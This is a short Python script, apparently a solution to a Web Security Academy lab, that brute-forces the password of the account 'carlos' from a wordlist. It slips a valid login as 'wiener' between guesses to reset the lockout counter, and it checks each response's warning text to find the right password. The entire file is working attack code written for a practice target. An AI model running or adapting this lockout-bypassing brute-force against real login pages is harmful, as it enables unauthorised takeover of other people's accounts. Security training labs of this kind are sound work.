import requests
from bs4 import BeautifulSoup

'''
 Your credentials: wiener:peter
Victim's username: carlos 
'''

url = "https://0a78009a04128edcc110169e00bb003a.web-security-academy.net/login"
username = "wiener"
password = open("password.txt","r").readlines()
index  = 1

for pas in password:
	print(f"index ke {index}")
	pas = pas.replace("\n","")
	payload_ganjil = f"username=wiener&password=peter"
	payload_genap = f"username=carlos&password={pas}"

	if(index % 2 != 0):
		req = requests.post(url, data=payload_ganjil).text
		print(payload_ganjil)
		print("login ulang")
	else:
		print(payload_genap)
		req = requests.post(url, data=payload_genap).text
		soup = str(BeautifulSoup(req, 'html.parser').find('p', class_='is-warning').get_text().strip())
		if(soup == "Incorrect password"):
			print(f"{pas} ini bukan password nya")
		else:
			print(f"{pas} ini passswordnya")
			break
	index += 1

#solved because the pass number one on password wordlist